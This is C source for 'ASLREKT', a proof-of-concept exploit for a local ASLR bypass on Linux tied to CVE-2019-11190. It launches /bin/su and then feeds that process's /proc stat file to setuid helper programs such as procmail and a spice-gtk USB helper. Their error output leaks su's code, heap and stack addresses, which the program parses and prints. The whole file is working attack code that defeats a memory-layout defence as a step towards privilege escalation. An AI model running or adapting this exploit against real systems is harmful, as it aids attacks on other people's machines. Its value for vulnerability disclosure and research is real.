
/*
 * ASLREKT is a proof of concept for generic local ASLR bypass in multiple
 * Linux kernel versions.
 *
 * The issue is based on CVE-2019-11190 and modern Linux versions are
 * still vulnerable.
 *
 * by F. Bento (@uid1000)
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>

#define OFFSET_TO_STACK 0x20ff0

void parse(char *buf)
{
        int count = 1;
        char *tok;
        tok = strtok(buf, " ");
        while(tok != NULL) {
                if(count == 31)
                        printf("\n[+] /bin/su .text is at 0x%llx\n", strtoul(tok, NULL, 10));
                else if(count == 52)
                        printf("[+] /bin/su heap is at 0x%llx\n", strtoul(tok, NULL, 10));
                else if(count == 56)
                        printf("[+] /bin/su stack is at 0x%llx\n", strtoul(tok, NULL, 10) - OFFSET_TO_STACK);
                count++;
                tok = strtok(NULL, " ");
        }
}

int main(int argc, char **argv)
{
        int fd, pid, pid2, p[2];
        char buf[4096];

        pid = fork();

        if(pid == 0) {
                printf("***** ASLREKT *****\n");
                snprintf(buf, sizeof(buf) - 1, "/proc/%d/stat", getppid());
                pipe(p);

                pid2 = fork();

                if(pid2 == 0) {
                        dup2(p[1], 1);
                        close(p[0]);
                        close(p[1]);

                        fd = open(buf, O_RDONLY);
                        dup2(fd, 0);
                        dup2(0, 2);
                        close(fd);
                        sleep(2);
                        execlp("/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper", "spice-client-glib-usb-acl-helper", NULL);
                        execlp("/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper", "spice-client-glib-usb-acl-helper", NULL);
                        execlp("/usr/bin/procmail", "procmail", NULL);
                }

                else {
                        close(p[1]);
                        wait(NULL);
                        read(p[0], buf, sizeof(buf));
                        parse(buf);
                }
        }

        else {
                sleep(2);
                execlp("/bin/su", "su", NULL);
        }

}
